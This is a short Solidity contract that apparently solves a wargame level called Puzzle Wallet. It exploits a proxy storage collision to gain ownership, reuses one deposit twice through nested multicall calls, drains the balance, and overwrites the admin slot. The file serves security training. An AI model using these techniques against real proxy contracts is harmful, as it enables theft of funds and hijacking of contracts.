// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./24PuzzleWallet.sol";

contract PuzzleWalletSolution {
    PuzzleProxy public puzzleProxy;
    PuzzleWallet public puzzleWallet;

    constructor(address puzzle) {
        puzzleProxy = PuzzleProxy(payable(puzzle));
        puzzleWallet = PuzzleWallet(puzzle);
    }

    function solveChallenge() public payable {
        puzzleProxy.proposeNewAdmin(address(this));
        puzzleWallet.addToWhitelist(address(this));

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );
        bytes[] memory functionCalls = new bytes[](2);
        functionCalls[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );
        functionCalls[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            depositSelector
        );

        uint256 targetBalance = msg.value;

        puzzleWallet.multicall{value: targetBalance}(functionCalls);
        puzzleWallet.execute(msg.sender, 2 * targetBalance, "");
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
